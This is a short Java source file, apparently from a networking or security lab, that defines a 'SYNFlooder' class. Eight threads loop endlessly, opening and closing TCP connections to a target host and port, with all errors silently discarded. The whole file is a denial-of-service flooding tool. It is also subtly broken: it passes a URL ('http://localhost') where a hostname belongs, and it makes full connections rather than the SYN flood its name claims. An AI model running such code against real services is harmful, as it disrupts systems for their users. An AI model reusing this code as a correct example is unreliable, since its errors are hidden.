package FOIS_LAB;

import java.net.InetSocketAddress;
import java.net.Socket;

public class SYNFlooder implements Runnable {
    private String url;
    private int port;

    SYNFlooder(String url, int port){
        this.url = url;
        this.port= port;
    }

    @Override
    public void run() {
        while(true){
            try{
                Socket socket = new Socket();
                socket.connect(new InetSocketAddress(url, port), 2500);
                Thread.sleep(100);
                socket.close();
            }catch (Exception e){

            }
        }

    }
    public static void main (String[] args){
        for (int i = 0; i < 8; i++) {
            new Thread(new SYNFlooder("http://localhost", 5000)).start();

        }
    }
}
